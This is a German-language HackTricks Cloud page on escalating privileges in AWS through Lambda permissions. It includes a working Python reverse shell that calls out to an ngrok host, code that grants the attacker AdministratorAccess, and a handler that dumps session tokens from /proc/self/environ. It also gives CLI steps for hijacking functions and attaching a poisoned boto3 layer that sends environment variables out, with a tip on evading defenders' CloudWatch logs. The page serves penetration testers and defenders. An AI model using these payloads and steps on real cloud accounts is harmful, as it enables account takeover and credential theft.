# AWS - Lambda Privilegieneskalation

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>

## lambda

Weitere Informationen zu Lambda finden Sie unter:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Benutzer mit den Berechtigungen **`iam:PassRole`, `lambda:CreateFunction` und `lambda:InvokeFunction`** k√∂nnen ihre Privilegien eskalieren.\
Sie k√∂nnen eine **neue Lambda-Funktion erstellen und ihr eine vorhandene IAM-Rolle zuweisen**, wodurch der Funktion die mit dieser Rolle verbundenen Berechtigungen gew√§hrt werden. Der Benutzer kann dann **Code f√ºr diese Lambda-Funktion schreiben und hochladen (zum Beispiel mit einer Reverse-Shell)**.\
Sobald die Funktion eingerichtet ist, kann der Benutzer **deren Ausf√ºhrung ausl√∂sen** und die beabsichtigten Aktionen durch Aufrufen der Lambda-Funktion √ºber die AWS-API ausf√ºhren. Auf diese Weise kann der Benutzer effektiv Aufgaben indirekt √ºber die Lambda-Funktion ausf√ºhren und dabei mit dem Zugriffsniveau arbeiten, das der mit ihr verbundenen IAM-Rolle gew√§hrt wurde.\\

Ein Angreifer k√∂nnte dies missbrauchen, um eine **Reverse-Shell zu erhalten und das Token zu stehlen**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Du k√∂nntest auch die Berechtigungen der Lambda-Rolle missbrauchen, die in der Lambda-Funktion selbst definiert sind. Wenn die Lambda-Rolle ausreichend Berechtigungen hatte, k√∂nntest du sie nutzen, um dir Administratorrechte zu gew√§hren:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Es ist auch m√∂glich, die Rollenberechtigungen der Lambda auszulesen, ohne eine externe Verbindung zu ben√∂tigen. Dies w√§re n√ºtzlich f√ºr **Netzwerkisolierte Lambdas**, die f√ºr interne Aufgaben verwendet werden. Wenn unbekannte Sicherheitsgruppen Ihre Reverse-Shells filtern, erm√∂glicht Ihnen dieses Code-St√ºck, die Berechtigungen direkt als Ausgabe der Lambda auszulesen.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potenzielle Auswirkungen:** Direktes Privilege Escalation auf die angegebene Lambda-Service-Rolle.

{% hint style="danger" %}
Beachten Sie, dass selbst wenn es interessant aussieht, **`lambda:InvokeAsync`** allein nicht die Ausf√ºhrung von `aws lambda invoke-async` erm√∂glicht. Sie ben√∂tigen auch `lambda:InvokeFunction`.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Wie im vorherigen Szenario k√∂nnen Sie sich die Berechtigung `lambda:InvokeFunction` erteilen, wenn Sie die Berechtigung `lambda:AddPermission` haben.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potenzielle Auswirkungen:** Direktes Privilegien-Eskalation zum angegebenen Lambda-Service-Rolle.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Benutzer mit den Berechtigungen **`iam:PassRole`, `lambda:CreateFunction` und `lambda:CreateEventSourceMapping`** (und m√∂glicherweise `dynamodb:PutItem` und `dynamodb:CreateTable`) k√∂nnen indirekt **Privilegien eskalieren**, selbst ohne `lambda:InvokeFunction`.\
Sie k√∂nnen eine **Lambda-Funktion mit b√∂sartigem Code erstellen und ihr eine vorhandene IAM-Rolle zuweisen**.

Anstatt den Lambda direkt aufzurufen, richtet der Benutzer eine vorhandene DynamoDB-Tabelle ein oder nutzt sie, indem er sie mit dem Lambda √ºber ein Ereignisquellen-Mapping verkn√ºpft. Diese Einrichtung stellt sicher, dass die Lambda-Funktion automatisch ausgel√∂st wird, wenn ein neuer Eintrag in der Tabelle erfolgt, entweder durch die Aktion des Benutzers oder einen anderen Prozess, wodurch die Lambda-Funktion indirekt aufgerufen und der Code mit den Berechtigungen der √ºbergebenen IAM-Rolle ausgef√ºhrt wird.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Wenn DynamoDB bereits in der AWS-Umgebung aktiv ist, muss der Benutzer nur die Ereignisquellenzuordnung f√ºr die Lambda-Funktion einrichten. Wenn DynamoDB jedoch nicht verwendet wird, muss der Benutzer eine neue Tabelle mit aktiviertem Streaming erstellen:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Jetzt ist es m√∂glich, die Lambda-Funktion mit der DynamoDB-Tabelle zu verbinden, indem Sie ein Ereignisquellen-Mapping erstellen:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Mit der Lambda-Funktion, die mit dem DynamoDB-Stream verkn√ºpft ist, kann der Angreifer die Lambda **indirekt ausl√∂sen, indem er den DynamoDB-Stream aktiviert**. Dies kann erreicht werden, indem er **einen Eintrag** in die DynamoDB-Tabelle einf√ºgt:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potenzielle Auswirkung:** Direktes Privilegien-Eskalation zum angegebenen Lambda-Service-Rolle.

### `lambda:AddPermission`

Ein Angreifer mit dieser Berechtigung kann **sich selbst (oder anderen) beliebige Berechtigungen gew√§hren** (dies generiert ressourcenbasierte Richtlinien, um Zugriff auf die Ressource zu gew√§hren):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potenzielle Auswirkungen:** Direktes Privilegien-Eskalation zum Lambda-Service-Rolle durch Berechtigung zur Code-√Ñnderung und Ausf√ºhrung.

### `lambda:AddLayerVersionPermission`

Ein Angreifer mit dieser Berechtigung kann sich selbst (oder anderen) die Berechtigung `lambda:GetLayerVersion` gew√§hren. Er k√∂nnte auf die Ebene zugreifen und nach Schwachstellen oder sensiblen Informationen suchen.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potenzielle Auswirkungen:** Potenzieller Zugriff auf sensible Informationen.

### `lambda:UpdateFunctionCode`

Benutzer mit der Berechtigung **`lambda:UpdateFunctionCode`** haben das Potenzial, **den Code einer vorhandenen Lambda-Funktion zu √§ndern, die mit einer IAM-Rolle verkn√ºpft ist.**\
Der Angreifer kann **den Code des Lambda √§ndern, um die IAM-Anmeldeinformationen abzufangen**.

Obwohl der Angreifer m√∂glicherweise nicht direkt in der Lage ist, die Funktion aufzurufen, ist es wahrscheinlich, dass die Lambda-Funktion durch bestehende Workflows oder Ereignisse ausgel√∂st wird und somit indirekt die Ausf√ºhrung des ge√§nderten Codes erm√∂glicht.
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potenzielle Auswirkungen:** Direktes Privilegien-Eskalation zum verwendeten Lambda-Service-Rolle.

### `lambda:UpdateFunctionConfiguration`

#### Einf√ºhrung

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) erm√∂glicht es, **Code** in Ihre Lambda-Funktion einzuschlie√üen, ihn jedoch **getrennt zu speichern**, sodass der Funktionscode klein bleiben kann und **mehrere Funktionen Code teilen k√∂nnen**.

Innerhalb von Lambda k√∂nnen Sie die Pfade √ºberpr√ºfen, von denen aus Python-Code mit einer Funktion wie der folgenden geladen wird:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Diese sind die Orte:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Zum Beispiel wird die Bibliothek boto3 aus `/var/runtime/boto3` (4. Position) geladen.

#### Ausnutzung

**Das Anh√§ngen einer Schicht an eine Funktion** erfordert nur die Berechtigung `lambda:UpdateFunctionConfiguration` und **Schichten k√∂nnen zwischen Konten geteilt werden**. Wir m√ºssten auch wissen, **welche Bibliotheken sie verwenden**, damit wir sie korrekt √ºberschreiben k√∂nnen, aber in diesem Beispiel gehen wir einfach davon aus, dass die angegriffene Funktion boto3 importiert.

Um auf Nummer sicher zu gehen, verwenden wir Pip, um die gleiche Version der boto3-Bibliothek aus der Lambda-Laufzeit zu installieren, auf die wir abzielen (Python 3.7), damit es keine Unterschiede gibt, die Probleme in der Ziel-Funktion verursachen k√∂nnten. Diese Laufzeit verwendet derzeit die boto3-Version 1.9.42.

Mit dem folgenden Code installieren wir die boto3-Version 1.9.42 und ihre Abh√§ngigkeiten in einen lokalen Ordner "lambda\_layer":
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
Als n√§chstes √∂ffnen wir `/lambda_layer/boto3/__init__.py` und f√ºgen den b√∂sartigen Code hinzu. Der Payload, den wir hinzuf√ºgen werden, sieht so aus:

![](<../../../.gitbook/assets/image (26).png>)

`requests` wird aus `botocore` importiert. Die Funktion wird Umgebungsvariablen exfiltrieren, und das try-except und ein Timeout von 0,1 dienen dazu, sicherzustellen, dass dieser Code nichts kaputt macht.

{% hint style="info" %}
**Wichtiger Hinweis:** Sie sollten in echten Pentests nicht mehr `from botocore.vendored import requests` verwenden, da eine ‚ÄûDeprecationWarning‚Äú in den CloudWatch-Protokollen dieser Funktion gedruckt wird, was wahrscheinlich dazu f√ºhren wird, dass Sie von einem Verteidiger erwischt werden.
{% endhint %}

Packen Sie diesen Code nun in eine **ZIP-Datei** und **laden** Sie ihn in eine **neue Lambda-Schicht im ANGRIFFSKONTO** hoch. Sie m√ºssen zuerst einen ‚Äûpython‚Äú-Ordner erstellen und Ihre Bibliotheken dort platzieren, damit der Code nach dem Hochladen in Lambda unter ‚Äû/opt/python/boto3‚Äú gefunden wird. Stellen Sie au√üerdem sicher, dass die Schicht mit Python 3.7 kompatibel ist und dass die **Schicht sich in derselben Region wie unsere Ziel-Funktion befindet**. Sobald das erledigt ist, verwenden wir `lambda:AddLayerVersionPermission`, um die Schicht **√∂ffentlich zug√§nglich zu machen**, damit unser Zielkonto sie verwenden kann. Verwenden Sie f√ºr diesen API-Aufruf Ihre pers√∂nlichen AWS-Anmeldeinformationen.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Nun werden wir mit den **kompromittierten Anmeldeinformationen**, die wir haben, den folgenden Befehl auf unserer Ziel-Lambda-Funktion "s3-getter" ausf√ºhren, der unsere **Lambda-Layer f√ºr die Querkonto-Berechtigung anh√§ngt**.
```bash
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Der n√§chste Schritt w√§re entweder die **Funktion selbst aufzurufen**, falls m√∂glich, oder darauf zu warten, dass sie auf herk√∂mmliche Weise aufgerufen wird - was die sicherere Methode ist.

Eine **unauff√§lligere M√∂glichkeit, diese Schwachstelle auszunutzen**, findet sich in:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potenzielle Auswirkungen:** Direkter Privilege Escalation zum verwendeten Lambda-Service-Rolle.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Vielleicht k√∂nnen Sie mit diesen Berechtigungen eine Funktion erstellen und sie aufrufen, indem Sie die URL aufrufen... aber ich konnte keinen Weg finden, um es zu testen, also lassen Sie mich wissen, wenn Sie es tun!

### Lambda MitM

Einige Lambdas erhalten m√∂glicherweise **sensible Informationen von den Benutzern in Parametern.** Wenn Sie RCE in einer davon erhalten, k√∂nnen Sie die Informationen exfiltrieren, die andere Benutzer an sie senden, √ºberpr√ºfen Sie dies in:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Referenzen

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben** oder **HackTricks im PDF-Format herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
